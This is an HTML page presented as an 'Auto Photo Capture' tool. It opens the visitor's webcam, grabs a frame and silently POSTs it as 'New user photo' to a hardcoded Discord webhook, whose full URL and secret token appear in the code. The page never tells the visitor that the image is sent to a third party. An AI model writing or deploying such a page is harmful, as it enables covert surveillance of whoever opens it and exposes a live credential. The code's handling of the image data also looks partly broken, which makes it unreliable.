<!DOCTYPE html>
<html>
<head>
    <title>Auto Photo Capture</title>
    <script>
        function capturePhoto() {
            var video = document.getElementById('video');
            var canvas = document.getElementById('canvas');
            var context = canvas.getContext('2d');
            
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    video.srcObject = stream;
                    video.play();
                })
                .catch(function(error) {
                    console.log('Error accessing camera: ', error);
                });
            
            video.addEventListener('canplay', function() {
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                var image = canvas.toDataURL('image/png');
                sendToDiscord(image);
            });
        }
        
        function sendToDiscord(image) {
            var webhookUrl = 'https://discord.com/api/webhooks/1187496675716104304/ZmCpK-ZLhY9sUloPNC-8bkmxyd2b3De52_oevo5cufS-kjts_eyvg5rKPo2qA8CzEmyZ';
            
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: 'New user photo',
                    embeds: [{
                        image: {
                            url: image
                        }
                    }]
                })
            })
            .then(function(response) {
                console.log('Photo sent to Discord');
            })
            .catch(function(error) {
                console.log('Error sending photo to Discord: ', error);
            });
        }
    </script>
</head>
<body>
    <h1>Auto Photo Capture</h1>
    <video id="video" width="640" height="480" autoplay></video>
    <canvas id="canvas" width="640" height="480"></canvas>
    <button onclick="capturePhoto()">Capture Photo</button>
</body>
</html>
